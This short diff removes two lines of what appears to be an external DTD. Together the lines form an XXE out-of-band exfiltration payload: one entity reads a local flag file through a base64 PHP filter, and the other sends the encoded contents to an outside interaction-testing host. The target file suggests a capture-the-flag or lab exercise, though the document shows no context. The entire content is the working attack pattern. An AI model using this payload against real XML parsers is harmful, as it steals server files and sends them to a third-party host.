@@ -1,2 +1,0 @@
-<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag.txt">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://uaoetzvavoopuntbmsppj31hgd3cn64uo.oast.fun/exfil=?%data;'>">
